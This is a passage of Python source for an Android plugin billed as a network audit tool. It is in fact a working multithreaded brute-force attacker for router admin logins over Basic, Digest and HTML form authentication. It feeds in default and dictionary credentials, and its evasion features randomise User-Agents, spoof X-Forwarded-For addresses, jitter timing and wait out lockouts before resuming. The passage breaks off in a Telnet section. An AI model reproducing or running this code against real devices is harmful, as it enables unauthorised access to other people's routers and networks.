_DEFAULT_PAIRS_CACHE = None


def default_dict_pairs():
    # the built-in wordlist is static: parse it once, otherwise screen rendering
    # re-parses 380 lines every 0.5 s during an attack
    global _DEFAULT_PAIRS_CACHE
    if _DEFAULT_PAIRS_CACHE is None:
        _DEFAULT_PAIRS_CACHE = _parse_pairs_static(DEFAULT_DICT_TEXT)
    return list(_DEFAULT_PAIRS_CACHE)


def _parse_pairs_static(text):
    pairs = []
    for raw in str(text or "").splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split(None, 1)
        if not parts:
            continue
        user = parts[0]
        password = parts[1].strip() if len(parts) > 1 else ""
        if not password and ":" in user:
            user, password = user.split(":", 1)
        pairs.append((user.strip(), password))
    return pairs


LOCKOUT_THRESHOLD = 5
NETFAIL_THRESHOLD = 4
NETFAIL_PAUSE_S = 30


def extract_retry_after(full_text):
    # pause the router demands via the Retry-After header; capped at 120 s
    m = re.search(r"(?im)^retry-after:\s*([0-9]+)", full_text or "")
    if not m:
        return 0
    try:
        return min(int(m.group(1)), 120)
    except Exception:
        return 0

ANDROID_MODELS = ["SM-S928B", "SM-G998B", "Pixel 8 Pro", "Pixel 9", "Redmi Note 13", "21061119DG"]
CHROME_MIN, CHROME_MAX = 118, 142


def generate_random_user_agent():
    platform_choice = random.choice([
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
        "Linux; Android {}; {}".format(random.randint(11, 15), random.choice(ANDROID_MODELS)),
        "iPhone; CPU iPhone OS {}_{} like Mac OS X".format(random.randint(15, 18), random.randint(0, 5)),
    ])
    chrome_ver = "{}.0.{}.{}".format(
        random.randint(CHROME_MIN, CHROME_MAX),
        random.randint(1000, 6999),
        random.randint(10, 199),
    )
    return (
        "Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/{} Safari/537.36".format(platform_choice, chrome_ver)
    )


def generate_basic_token(username, password):
    raw = "{}:{}".format(username, password).encode("utf-8")
    return base64.b64encode(raw).decode("ascii")


def parse_digest_challenge(header_value):
    # accepts both a full WWW-Authenticate line and just the value after it
    body = str(header_value or "").split(":", 1)[-1]
    params = {}
    if "digest" not in body.lower():
        return params
    for match in re.finditer(r'(\w+)\s*=\s*(?:"([^"]*)"|([^\s,]+))', body):
        params[match.group(1).lower()] = match.group(2) if match.group(2) is not None else match.group(3)
    return params


def md5_hex(text):
    return hashlib.md5(str(text).encode("utf-8")).hexdigest()


def build_digest_header(params, username, password, method, path, nc="00000001", cnonce=""):
    realm = params.get("realm", "")
    nonce = params.get("nonce", "")
    qop = params.get("qop", "")
    uri = path or "/"
    ha1 = md5_hex("{}:{}:{}".format(username, realm, password))
    ha2 = md5_hex("{}:{}".format(method, uri))
    opaque = params.get("opaque", "")
    if qop:
        response = hashlib.md5("{}:{}:{}:{}:auth:{}".format(ha1, nonce, nc, cnonce or "0a4b1f", ha2).encode()).hexdigest()
        header = (
            'Digest username="{}", realm="{}", nonce="{}", uri="{}", '
            'response="{}", qop=auth, nc={}, cnonce="{}", algorithm=MD5'.format(
                username, realm, nonce, uri, response, nc, cnonce or "0a4b1f"
            )
        )
    else:
        response = hashlib.md5("{}:{}:{}".format(ha1, nonce, ha2).encode()).hexdigest()
        header = (
            'Digest username="{}", realm="{}", nonce="{}", uri="{}", response="{}", algorithm=MD5'.format(
                username, realm, nonce, uri, response
            )
        )
    if opaque:
        header += ', opaque="{}"'.format(opaque)
    return header


def build_form_body(username, password, fields=None):
    if fields and fields[1]:
        # page fields beat any reference list: send exactly what the router asks for
        user_f, pass_f, hidden = fields
        pairs = list(hidden)
        if user_f:
            pairs.append((user_f, username))
        if pass_f:
            pairs.append((pass_f, password))
        if pairs:
            return urllib.parse.urlencode(pairs)
    pairs = [
        ("username", username),
        ("password", password),
        ("userName", username),
        ("passWord", password),
        ("luci_username", username),
        ("luci_password", password),
        ("login_username", username),
        ("login_password", password),
        ("admin_password", password),
    ]
    # urlencode is mandatory: otherwise =,&,+ and spaces in the password break body parsing
    return urllib.parse.urlencode(pairs)


# user/pass field names come from the router page itself: every brand has its own
# names (luci_*, userName, admPasswd...); a fixed list is always behind.
# hidden fields (nonce/token) go into the body with their values as is
def extract_form_fields(html):
    for block in re.findall(r"<form\b.*?</form>", html or "", re.IGNORECASE | re.DOTALL):
        if not any(m in block.lower() for m in LOGIN_PASSWORD_INPUT_MARKERS):
            continue
        user_f, pass_f, hidden = "", "", []
        for inp in re.findall(r"<input\b[^>]*>", block, re.IGNORECASE):
            nm = re.search(r'name\s*=\s*["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
            if not nm:
                continue
            name_s = nm.group(1)
            typ = re.search(r'type\s*=\s*["\']?([^"\'\s>]+)', inp, re.IGNORECASE)
            typ_s = (typ.group(1).lower() if typ else "text")
            val = re.search(r'value\s*=\s*["\']([^"\']*)["\']', inp, re.IGNORECASE)
            if typ_s == "hidden":
                hidden.append((name_s, val.group(1) if val else ""))
            elif typ_s == "password" and not pass_f:
                pass_f = name_s
            elif typ_s in ("text", "email", "tel", "number", "") and not user_f:
                user_f = name_s
        if pass_f:
            return user_f, pass_f, hidden
    return "", "", []


class NetAuditPro(BasePlugin):
    def on_plugin_load(self):
        self.add_module(
            title="Network Audit Pro",
            description="Network device audit: admin panel access (Basic/Digest/form), Telnet and UPnP checks, config leaks, reports and an event log. The plugin works but needs testing on different routers. If you find bugs or errors, please send them to me on Telegram: @Pinaplast457",
            icon="lock_open",
            screen="main",
            section="PLUGINS"
        )

        self.running = False
        self.stop_flag = False
        self.found_flag = False
        self.brute_done = False
        self.found_creds = None
        self.expected_total = 0
        self.threads = []

        self.logs = []
        self.logs_lock = threading.Lock()

        self.stats_lock = threading.Lock()
        self.tried_count = 0
        self.fail_count = 0
        self.lockout_count = 0
        self.evade_pauses = 0
        self.pps = 0
        self._cursor = 0
        self._cursor_lock = threading.Lock()
        self._consec_lockouts = 0
        self._consec_netfail = 0
        self._cooldown_until = 0.0
        self._run_gen = 0

        self.vulns_found = []
        self.telnet_creds = None
        self._probing = False
        self._last_seen_ip = ""
        self._dict_scan_cache = ()
        self.brand_hint = ""
        self.panel_title = ""
        self.auth_realm = ""
        self.auth_scheme = "basic"
        self.digest_params = None
        self._form_fields = None

        self.ping_status_text = "Press \"Ping\" to probe the router."
        self.scan_results_txt = "The port scanner will show results here."
        self.generated_report_text = ""
        self._brute_started_ts = 0.0
        self.last_run_summary = None

        self.gateway = self.get_setting("gateway", "")
        self.port = self._safe_int(self.get_setting("port", 80), 80, 1, 65535)
        self.mode = self.get_setting("mode", "auto")
        self.num_threads = self._safe_int(self.get_setting("num_threads", 12), 12, 1, 64)
        self.timeout_seconds = self._safe_int(self.get_setting("timeout_seconds", 4), 4, 1, 30)
        self.stop_on_success = self.get_setting("stop_on_success", True) is True
        self.custom_users_text = str(self.get_setting("custom_users", ""))
        self.custom_passes_text = str(self.get_setting("custom_passes", ""))
        self.custom_dict_text = str(self.get_setting("custom_dict_text", ""))
        self._imported_pairs_count = len(_parse_pairs_static(self.custom_dict_text))

        self.evasion_ua = self.get_setting("evasion_ua", True) is True
        self.evasion_xff = self.get_setting("evasion_xff", False) is True
        self.attempt_delay_ms = self._safe_int(self.get_setting("attempt_delay_ms", 20), 20, 0, 5000)
        self.lockout_pause_s = self._safe_int(self.get_setting("lockout_pause_s", 10), 10, 0, 600)
        self.manual_dict_path = str(self.get_setting("manual_dict_path", ""))

        self.status_line = "Waiting to start. Check the gateway and port."
        self._cached_ip = ""
        self._cached_ip_time = 0.0
        self._cached_vpn = None
        self._cached_vpn_time = 0.0
        self._device_ssid = ""
        self._init_auto_gateway()

    def _log(self, text, level="INFO"):
        icons = {
            "INFO": "ℹ️",
            "WARN": "⚠️",
            "ERR": "❌",
            "OK": "✅",
            "BRUTE": "🔨",
            "SCAN": "🔍",
            "HIT": "🎉",
            "VULN": "🔓",
            "DICT": "🔤",
            "EVADE": "🥷"
        }
        prefix = icons.get(level, "🔹")
        timestamp = time.strftime("%H:%M:%S")
        entry = "[{}] {} {}".format(timestamp, prefix, text)
        with self.logs_lock:
            self.logs.append(entry)
            if len(self.logs) > 80:
                self.logs.pop(0)

    def _clear_logs(self):
        with self.logs_lock:
            self.logs.clear()
        self.refresh()

    def _safe_close_socket(self, sock):
        if not sock:
            return
        try:
            sock.close()
        except Exception:
            pass

    def _parse_csv(self, text):
        items = []
        for part in str(text or "").split(","):
            clean = part.strip()
            if clean:
                items.append(clean)
        return items

    def _parse_dict_pairs(self, text):
        return _parse_pairs_static(text)

    # ------------------- Dictionary file selection -------------------

    DICT_DIRS = ["/sdcard", "/sdcard/Download", "/sdcard/Documents"]
    DICT_WALK_DEPTH = 2

    def _scan_dict_files(self, max_results=24):
        cached = self._dict_scan_cache
        # ttl cache: os.walk over the whole storage must not run on every render
        if cached and cached[0] >= max_results and (time.time() - cached[1]) < 10.0:
            return list(cached[2][:max_results])
        found = {}
        for base_dir in self.DICT_DIRS:
            try:
                for dirpath, dirnames, filenames in os.walk(base_dir):
                    depth = dirpath[len(base_dir):].count(os.sep)
                    if depth >= self.DICT_WALK_DEPTH:
                        dirnames[:] = []
                    for filename in filenames:
                        if not filename.lower().endswith(".txt"):
                            continue
                        if filename.startswith("."):
                            continue
                        full_path = os.path.join(dirpath, filename)
                        try:
                            size_bytes = os.path.getsize(full_path)
                            if size_bytes <= 0 or size_bytes > 2097152:
                                continue
                            found[full_path] = size_bytes
                        except Exception:
                            pass
                    if len(found) >= max_results:
                        break
            except Exception:
                continue
            if len(found) >= max_results:
                break
        ordered = sorted(found.items(), key=lambda kv: kv[0])
        self._dict_scan_cache = (max_results, time.time(), ordered)
        return ordered[:max_results]

    def _read_text_file(self, path, byte_limit=1048576):
        size = os.path.getsize(path)
        if size > byte_limit:
            self.toast("⚠️ File is larger than 1 MB, reading the first 1 MB")
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return f.read(byte_limit)

    def load_dict_from_path(self, path=None):
        picked = str(path or self.manual_dict_path or "").strip()
        self._dict_scan_cache = ()
        if not picked:
            names = self._scan_dict_files(1)
            if names:
                picked = names[0][0]
        if not picked:
            self.toast("❌ Specify a file path or pick one from the list")
            return False
        looks_uri = picked.startswith("content:") or picked.startswith("file:")
        if not looks_uri and not os.path.exists(picked) and not picked.lower().endswith(".txt"):
            # try appending the extension, but only if the bare path does not exist
            candidate = picked + ".txt"
            if os.path.exists(candidate):
                picked = candidate
        if not looks_uri and not os.path.exists(picked):
            self._log("Dictionary file not found: {}".format(picked), "ERR")
            self.toast("❌ File not found: {}".format(os.path.basename(picked) if picked else "-"))
            self.refresh()
            return False
        try:
            content = self._read_text_file(picked)
        except Exception as exc:
            self._log("Failed to read {}: {}".format(picked, exc), "ERR")
            self.toast("❌ File is unreadable")
            self.refresh()
            return False
        pairs = self._parse_dict_pairs(content)
        self.custom_dict_text = content
        self._imported_pairs_count = len(pairs)
        self.set_setting("custom_dict_text", content)
        self.manual_dict_path = picked
        self.set_setting("manual_dict_path", picked)
        shown_size = str(os.path.getsize(picked)).replace(",", " ")
        self._log("Dictionary from {}: {} pairs ({} bytes)".format(picked, len(pairs), shown_size), "DICT")
        self.toast("✅ Loaded {} pairs from {}".format(len(pairs), os.path.basename(picked)))
        self.refresh()
        return True

    def clear_custom_dict(self):
        self.custom_dict_text = ""
        self._imported_pairs_count = 0
        self.set_setting("custom_dict_text", "")
        self._log("Custom dictionary cleared", "DICT")
        self.refresh()

    # ------------------- Candidates -------------------

    def _build_candidates(self):
        seen = set()
        result = []

        def push(u, p):
            key = (u, p)
            if key not in seen:
                seen.add(key)
                result.append(key)

        for u, p in BRAND_CREDS.get(self.brand_hint or "", []):
            push(u, p)

        if self.mode == "auto":
            push("", "")
            push("admin", "")
            push("", "admin")

        for u, p in default_dict_pairs()[:500]:
            push(u, p)

        imported = self._parse_dict_pairs(self.custom_dict_text)
        if imported:
            limited = imported[:10000]
            for u, p in limited:
                push(u, p)
            if len(imported) > 10000:
                self._log("Custom dictionary truncated to 10000 pairs", "WARN")

        if self.mode != "form":
            for u, p in GENERIC_CREDS:
                push(u, p)

        users = self._parse_csv(self.custom_users_text)
        passes = self._parse_csv(self.custom_passes_text)
        for u in users:
            push(u, "")
        for i in range(min(len(users), len(passes))):
            push(users[i], passes[i])

        if self.mode != "basic":
            for u in USER_DICT:
                for p in PASS_DICT:
                    push(u, p)

        return result

    # ------------------- Recon and detection -------------------

    def detect_brand_from_page(self, title, server_header, body_lower):
        combined = "{} {} {}".format(title, server_header, body_lower).lower()
        best_name = "Generic"
        best_score = 0
        for name, keys in BRAND_SIGNATURES.items():
            score = 0
            for key in keys:
                if key in combined:
                    score += 1
            if score > best_score:
                best_score = score
                best_name = name
        return best_name

    def parse_title(self, html):
        match = re.search(r"<title>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
        if match:
            return re.sub(r"\s+", " ", match.group(1)).strip()
        return ""

    def extract_server_header(self, response):
        lowered = response.lower()
        idx = lowered.find("server:")
        if idx < 0:
            return ""
        end = lowered.find("\n", idx)
        if end < 0:
            end = min(len(response), idx + 120)
        parts = response[idx:end].split(":", 1)
        return parts[1].strip() if len(parts) > 1 else ""

    def extract_realm(self, response):
        www = self.extract_www_authenticate(response)
        if not www:
            return ""
        # strip the quotes on both sides and take the realm= value itself
        m = re.search(r'realm\s*=\s*"([^"]*)"', www)
        if m:
            return m.group(1)
        m = re.search(r'realm\s*=\s*([^\s,]+)', www)
        return m.group(1).strip() if m else ""

    def extract_www_authenticate(self, response):
        lowered = response.lower()
        idx = lowered.find("www-authenticate:")
        if idx < 0:
            return ""
        end = response.find("\n", idx)
        if end < 0:
            end = len(response)
        return response[idx:end].split(":", 1)[-1].strip()

    def _clean_form_action(self, action):
        action = str(action or "").strip()
        if action.lower().startswith("http"):
            slash_idx = action.find("/", action.find("//") + 2)
            action = action[slash_idx:] if slash_idx >= 0 else "/"
        # strip any whitespace/newlines — they break the request line
        action = "".join(action.split())
        if action and not action.startswith("/"):
            action = "/" + action
        return action

    def find_form_action(self, html):
        # prefer the form with a password field: the first form on a page may be search/logout
        blocks = re.findall(r"<form\b.*?</form>", html, re.IGNORECASE | re.DOTALL)
        fallback = ""
        for block in blocks:
            match = re.search(r"action\s*=\s*[\"']([^\"']+)[\"']", block, re.IGNORECASE)
            if not match:
                continue
            action = self._clean_form_action(match.group(1))
            if not action:
                continue
            if any(marker in block.lower() for marker in LOGIN_PASSWORD_INPUT_MARKERS):
                return action
            if not fallback:
                fallback = action
        match = re.search(r"<form[^>]*action\s*=\s*[\"']([^\"']+)[\"']", html, re.IGNORECASE)
        if match:
            action = self._clean_form_action(match.group(1))
            if action:
                return action
        return fallback

    def fetch_realms_dictionary(self, realm):
        low = realm.lower()
        for key in sorted(CREDS_BY_REALM.keys(), key=len, reverse=True):
            if key in low:
                self._log("Realm '{}': applying category '{}' defaults first".format(realm, key), "SCAN")
                return CREDS_BY_REALM[key]
        return []

    def _get_wifi_info(self):
        ssid = None
        ip = None
        is_wifi = False
        ssid_from_api = False
        try:
            device_json = self.api.getDevice()
            data = json.loads(str(device_json)) if isinstance(device_json, str) else device_json
            if isinstance(data, dict):
                wifi = data.get("wifi", {}) or data.get("network", {}).get("wifi", {})
                raw_ssid = wifi.get("ssid") or wifi.get("name") or wifi.get("SSID")
                raw_ip = wifi.get("ip") or wifi.get("IP") or wifi.get("address")
                if raw_ssid and str(raw_ssid).strip() not in ["<unknown ssid>", "0x", "", "null", "None"]:
                    ssid = str(raw_ssid).strip()
                    self._device_ssid = ssid
                    ssid_from_api = True
                    is_wifi = True
                if raw_ip and str(raw_ip).strip() not in ["", "null", "None"]:
                    ip = str(raw_ip).strip()
        except Exception:
            pass
        if not ip or ip in ["—", "127.0.0.1"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(0.4)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                self._safe_close_socket(s)
            except Exception:
                ip = None
        if ip and ip != getattr(self, "_last_seen_ip", ""):
            # the network changed — the old SSID is stale; reset it only if
            # the API did not provide a fresh SSID in this call
            if not ssid_from_api:
                self._device_ssid = ""
        self._last_seen_ip = ip or ""
        if ip:
            if ip.startswith("198.18."):
                ssid = "VPN Fake-IP (not Wi-Fi)"
                is_wifi = False
            elif ip.startswith("192.168."):
                is_wifi = True
                if not ssid:
                    ssid = "Wi-Fi (LAN)"
            elif ip.startswith("100.") or (ip.startswith("10.") and not is_wifi):
                if not ssid:
                    ssid = "Mobile network / VPN"
            else:
                if not ssid:
                    ssid = "Connected (Wi-Fi/LAN)"
                    is_wifi = True
        else:
            ssid = "Wi-Fi not connected"
        return ssid, ip or "—", is_wifi

    def _detect_vpn(self):
        now = time.time()
        if self._cached_vpn is not None and (now - self._cached_vpn_time) < 15.0:
            return self._cached_vpn
        ssid, ip, _ = self._get_wifi_info()
        device_ssid = getattr(self, "_device_ssid", "") or ""
        vpn_active = bool(ip.startswith("198.18.") or ("vpn" in device_ssid.lower()))
        self._cached_vpn = vpn_active
        self._cached_vpn_time = now
        return vpn_active

    # ------------------- HTTP core with detection evasion -------------------

    def http_request(self, host, port, method, path, body=None, auth_token=None, timeout=4.0, evade=True):
        user_agent = generate_random_user_agent() if (evade and self.evasion_ua) else "Mozilla/5.0"
        headers = [
            "{} {} HTTP/1.1".format(method, path),
            "Host: {}:{}".format(host, port),
            "User-Agent: {}".format(user_agent),
            "Connection: close"
        ]
        if evade and self.evasion_xff:
            fake_ip = "192.168.{}.{}".format(random.randint(0, 255), random.randint(2, 254))
            headers.append("X-Forwarded-For: {}".format(fake_ip))
        if auth_token:
            # a base64 token without spaces => Basic; a value with a scheme (Digest ...) passes as is
            if " " in str(auth_token):
                headers.append("Authorization: {}".format(auth_token))
            else:
                headers.append("Authorization: Basic {}".format(auth_token))
        if body is not None:
            headers.append("Content-Type: application/x-www-form-urlencoded")
            headers.append("Content-Length: {}".format(len(body)))
        payload = ("\r\n".join(headers) + "\r\n\r\n").encode("utf-8")
        if body is not None:
            payload += body.encode("utf-8")

        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            if port == 443:
                sock = _tls_context().wrap_socket(sock, server_hostname=host)
            sock.sendall(payload)
            response = b""
            # one overall deadline for the whole receive: a slow/tricky server must not
            # stretch a single attempt into several consecutive timeouts
            deadline = time.time() + timeout
            while len(response) < 65536:
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                sock.settimeout(min(remaining, 1.0))
                try:
                    chunk = sock.recv(8192)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                response += chunk
            if b"transfer-encoding: chunked" in response.lower():
                bsep = response.find(b"\r\n\r\n")
                if bsep >= 0:
                    response = response[:bsep + 4] + decode_chunked_body(response[bsep + 4:])
            # latin-1 maps back to bytes losslessly — needed for rom-0 parsing
            text = response.decode("latin-1", errors="replace")
            head_line = text.split("\n", 1)[0].strip()
            try:
                status_code = int(head_line.split(" ")[1])
            except Exception:
                status_code = 0
            location = ""
            low = text.lower()
            idx = low.find("location:")
            if idx >= 0:
                end = text.find("\n", idx)
                if end < 0:
                    end = min(len(text), idx + 120)
                location = text[idx:end].split(":", 1)[1].strip()
            has_cookie = "set-cookie:" in low
            sep = text.find("\r\n\r\n")
            body_text = text[sep + 4:] if sep >= 0 else ""
            return status_code, location, has_cookie, body_text, text
        except Exception as exc:
            return -1, "", False, "", "socket error: {}".format(exc)
        finally:
            self._safe_close_socket(sock)

    def _jitter_sleep(self):
        base_ms = self.attempt_delay_ms
        if base_ms <= 0:
            return
        low_ms = base_ms * 0.5
        high_ms = base_ms * 1.5
        time.sleep(random.uniform(low_ms, high_ms) / 1000.0)

    def _wait_out_cooldown(self):
        while not self.stop_flag and not (self.found_flag and self.stop_on_success):
            now = time.time()
            if now >= self._cooldown_until:
                return
            time.sleep(min(0.2, max(0.05, self._cooldown_until - now)))

    def _register_lockout_signal(self):
        with self.stats_lock:
            self._consec_lockouts += 1
            streak = self._consec_lockouts
        if streak >= LOCKOUT_THRESHOLD and self.lockout_pause_s > 0:
            with self.stats_lock:
                if self._consec_lockouts >= LOCKOUT_THRESHOLD:
                    self._consec_lockouts = 0
                    self._cooldown_until = time.time() + float(self.lockout_pause_s)
                    self.evade_pauses += 1
                    should_log = True
                else:
                    should_log = False
            if should_log:
                self._log("🥷 The router started blocking (a run of 403/429). Pausing {} s, then continuing".format(
                    self.lockout_pause_s
                ), "EVADE")

    def _reset_lockout_streak(self):
        with self.stats_lock:
            self._consec_lockouts = 0

    def _apply_retry_after(self, full_text):
        # Retry-After header: the router itself asks for a pause — do not keep hammering
        ra = extract_retry_after(full_text)
        if ra > 0:
            with self.stats_lock:
                self._cooldown_until = max(self._cooldown_until, time.time() + ra)
            self._log("The router asks for a pause (Retry-After: {} s) — honoring it".format(ra), "EVADE")

    def _register_netfail_signal(self):
        # a run of full network failures: the router/firewall started dropping our packets
        with self.stats_lock:
            self._consec_netfail += 1
            streak = self._consec_netfail
        if streak >= NETFAIL_THRESHOLD:
            with self.stats_lock:
                self._consec_netfail = 0
                self._cooldown_until = max(self._cooldown_until, time.time() + NETFAIL_PAUSE_S)
                self.evade_pauses += 1
            self._log("🛑 {} attempts with no reply in a row — the router likely cut us off (IP ban). Pausing {} s".format(
                NETFAIL_THRESHOLD, NETFAIL_PAUSE_S
            ), "EVADE")

    def _reset_netfail_streak(self):
        with self.stats_lock:
            self._consec_netfail = 0

    def _looks_like_login_page(self, body):
        low = (body or "").lower()
        has_password_input = any(marker in low for marker in LOGIN_PASSWORD_INPUT_MARKERS)
        logged_in_marker_present = any(marker in low for marker in LOGGED_IN_MARKERS)
        return has_password_input and not logged_in_marker_present

    def _normalize_page_sample(self, text):
        # normalize the page: strip digits (nonces/counters) and whitespace
        return re.sub(r"\s+", " ", re.sub(r"[0-9]", "", str(text or ""))).strip()[:400]

    def _verify_http_hit(self, host, port, method, path, form_body, auth_value, timeout, body):
        # double check: some panels serve the same page
        # with 200 for SEVERAL passwords or even any of them (JS login).
        # The control is a request with KNOWN-WRONG credentials: if a garbage
        # password gets the same page, the found hit is fake.
        # (An anonymous GET is not enough: a panel may serve 401 to anonymous,
        # and 200 to any non-empty password.)
        text = body or ""
        try:
            if form_body is not None:
                # form: the control must repeat the path, method and login fields —
                # otherwise the router will tell the control apart from the brute force
                control = build_form_body("__netaudit_probe__", "__definitely_wrong__", getattr(self, "_form_fields", None))
                c_status, c_loc, _ck, c_body, _full = self.http_request(
                    host, port, "POST", path or "/", control, None, timeout, evade=False
                )
            else:
                c_status, c_loc, _ck, c_body, _full = self.http_request(
                    host, port, "GET", "/", None,
                    generate_basic_token("__netaudit_probe__", "__definitely_wrong__"),
                    timeout, evade=False
                )
        except Exception:
            return True
        if c_status in (401, 403):
            # a proper auth check: the wrong password was rejected, trust the hit
            return True
        c_text = c_body or ""
        c_low = c_text.lower()
        rejected_page = (
            self._looks_like_login_page(c_text)
            or any(m in c_low for m in ("invalid", "incorrect", "error", "wrong", "denied", "unauthorized", "failed"))
        )
        if self._normalize_page_sample(c_body) == self._normalize_page_sample(text):
            # any credentials return the same page — fake
            return False
        if rejected_page:
            # wrong creds showed a login/error page — a genuine reject, the hit is real
            return True
        c_loc_l = (c_loc or "").lower()
        if 300 <= c_status < 400 and ("login" in c_loc_l or "error" in c_loc_l or "auth" in c_loc_l):
            return True
        if c_status <= 0 or c_status >= 400:
            # the control behaves oddly (404/5xx/failure) — draw no conclusions
            return True
        # for wrong credentials the server returned an unrelated page: it behaves
        # the same as for the "hit" — it does not tell passwords apart, count it fake
        return False

    def judge_response(self, status_code, location, body):
        if status_code == 401:
            return "fail"
        if status_code in (403, 429):
            # OpenWrt/LuCI serves 403 with a login form to an unauthenticated user:
            # that is "not logged in", not a ban — otherwise the cooldown logic breaks
            if self._looks_like_login_page(body or ""):
                return "fail"
            return "lockout"
        if status_code == 200:
            text = body or ""
            if re.search(r'(?i)http-equiv\s*=\s*["\']?refresh[^>]*url\s*=', text):
                # an auto-redirect page to the login path — not a dashboard
                return "fail"
            if self._looks_like_login_page(text):
                return "fail"
            compact = text.strip()
            if not compact:
                return "fail"
            # do not turn empty, markup-less bodies into a false hit:
            # HTML/JSON signs or an explicit logged-in marker are required
            strong_markup = ("<" in compact) or ("{" in compact)
            strong_marker = any(m in compact.lower() for m in LOGGED_IN_MARKERS)
            if not (strong_markup or strong_marker):
                return "fail"
            return "hit"
        if 300 <= status_code < 400:
            # a redirect switching http→https (nginx would keep serving
            # 302 to https://host/) — not "access gained", an invitation to TLS.
            # look at the path without the host: an empty path or "/" is a service redirect.
            raw = location or ""
            path_part = raw
            if "://" in raw:
                try:
                    path_part = urllib.parse.urlsplit(raw).path or "/"
                except Exception:
                    path_part = "/"
            loc = path_part.lower()
            if not loc or loc == "/":
                return "fail"
            if "login" in loc or "error" in loc or "auth" in loc:
                return "fail"
            return "hit"
        return "fail"

    # ------------------- Workers -------------------

    def worker_loop(self, worker_id, candidates, attack_mode, form_path):
        host = self.gateway
        port = self.port
        timeout = float(self.timeout_seconds)
        form_path = form_path or "/"
        halt_on_found = bool(self.stop_on_success)
        continue_after_hit = not halt_on_found
        gen = self._run_gen

        while not self.stop_flag and (not self.found_flag or continue_after_hit):
            if gen != self._run_gen:
                break
            try:
                self._wait_out_cooldown()
                if gen != self._run_gen:
                    break
                if self.stop_flag or (self.found_flag and halt_on_found):
                    break

                with self._cursor_lock:
                    # check the generation again UNDER the lock: otherwise a worker
                    # asleep in a timeout could steal a pair of the new run
                    if gen != self._run_gen:
                        break
                    pos = self._cursor
                    if pos >= len(candidates):
                        break
                    self._cursor += 1

                username, password = candidates[pos]

                got_hit = False
                hit_mode = attack_mode
                lockout_seen = False
                try_full_text = ""

                if attack_mode in ("basic", "auto"):
                    self._jitter_sleep()
                    if self.auth_scheme == "digest":
                        # Digest: an anonymous GET yields a fresh nonce; sign the second request with it
                        _s0, _loc0, _ck0, _b0, full0 = self.http_request(
                            host, port, "GET", "/", None, None, timeout
                        )
                        www0 = self.extract_www_authenticate(full0)
                        fresh = parse_digest_challenge(www0) if www0.lower().startswith("digest") else {}
                        params = fresh if fresh.get("nonce") else (
                            self.digest_params if self.digest_params and self.digest_params.get("nonce") else None
                        )
                        if params:
                            auth_value = build_digest_header(params, username, password, "GET", "/")
                        else:
                            # no nonce — Digest unavailable, try as Basic
                            auth_value = generate_basic_token(username, password)
                    else:
                        auth_value = generate_basic_token(username, password)
                    status_code, location, _, body, try_full_text = self.http_request(
                        host, port, "GET", "/", None, auth_value, timeout
                    )
                    verdict = self.judge_response(status_code, location, body)
                    if verdict == "hit" and self._verify_http_hit(host, port, "GET", "/", None, auth_value, timeout, body):
                        got_hit = True
                        hit_mode = "digest" if (self.auth_scheme == "digest" and auth_value.startswith("Digest")) else "basic"
                    elif verdict == "lockout":
                        lockout_seen = True
                    elif attack_mode == "auto":
                        self._jitter_sleep()
                        f_status, f_loc, _, f_body, f_txt = self.http_request(
                            host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout
                        )
                        f_verdict = self.judge_response(f_status, f_loc, f_body)
                        if f_verdict == "hit" and self._verify_http_hit(
                            host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout, f_body
                        ):
                            got_hit = True
                            hit_mode = "form"
                        elif f_verdict == "lockout":
                            lockout_seen = True
                            try_full_text = f_txt
                else:
                    self._jitter_sleep()
                    f_status, f_loc, _, f_body, f_txt = self.http_request(
                        host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout
                    )
                    f_verdict = self.judge_response(f_status, f_loc, f_body)
                    if f_verdict == "hit" and self._verify_http_hit(
                        host, port, "POST", form_path, build_form_body(username, password, getattr(self, "_form_fields", None)), None, timeout, f_body
                    ):
                        got_hit = True
                        hit_mode = "form"
                    elif f_verdict == "lockout":
                        lockout_seen = True
                        try_full_text = f_txt

                with self.stats_lock:
                    self.tried_count += 1
                    if got_hit:
                        # check the generation here too: a worker of the old run,
                        # still noisy in a socket timeout, must not overwrite
                        # the fresh found_creds of the new run
                        if not self.found_flag and gen == self._run_gen:
                            self.found_creds = (username, password, hit_mode)
                            self.found_flag = True
                            self._log("Password found! Login '{}' Password '{}' (via {})".format(
                                username if username else "(empty)",
                                password if password else "(empty)",
                                AUTH_MODE_LABELS.get(hit_mode, "HTML form POST")
                            ), "HIT")
                            if halt_on_found:
                                self.stop_flag = True
                    elif lockout_seen:
                        self.lockout_count += 1
                    else:
                        self.fail_count += 1

                if lockout_seen:
                    # Retry-After from the response (429/503) takes priority over internal rituals
                    self._apply_retry_after(try_full_text)
                    self._register_lockout_signal()
                else:
                    self._reset_lockout_streak()

                if attack_mode == "auto":
                    net_fail = status_code <= 0 and f_status <= 0
                elif attack_mode in ("basic",):
                    net_fail = status_code <= 0
                else:
                    net_fail = f_status <= 0
                if net_fail:
                    self._register_netfail_signal()
                else:
                    self._reset_netfail_streak()

                if halt_on_found and self.found_flag:
                    break
            except Exception as exc:
                # a worker must not die silently: it would hang the whole brute force
                try:
                    with self.stats_lock:
                        self.fail_count += 1
                    self._log("Worker {}: attempt error: {}".format(worker_id, exc), "ERR")
                except Exception:
                    pass

        if worker_id == 0:
            self.brute_done = True

    # ------------------- Telnet and UPnP -------------------

    def _read_telnet_until(self, sock, markers, timeout=3.0):
        buf = bytearray()
        deadline = time.time() + timeout
        while time.time() < deadline:
            leftover = min(0.5, max(0.05, deadline - time.time()))
            sock.settimeout(leftover)
            try:
                chunk = sock.recv(1024)
            except socket.timeout:
